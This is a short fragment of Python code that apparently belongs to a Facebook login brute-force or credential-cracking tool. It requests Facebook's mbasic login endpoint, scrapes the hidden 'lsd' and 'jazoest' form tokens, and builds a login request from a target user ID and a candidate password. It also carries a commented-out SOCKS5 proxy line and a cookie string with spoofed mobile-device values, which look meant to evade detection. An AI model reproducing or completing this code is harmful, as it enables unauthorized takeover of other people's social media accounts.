...
#			proxs= {'http': 'socks5://'+nip}
			...
			p = ses.get("https://mbasic.facebook.com/login/device-based/login/async/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2F%3Flocale%3Did_ID&lwv=100")
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
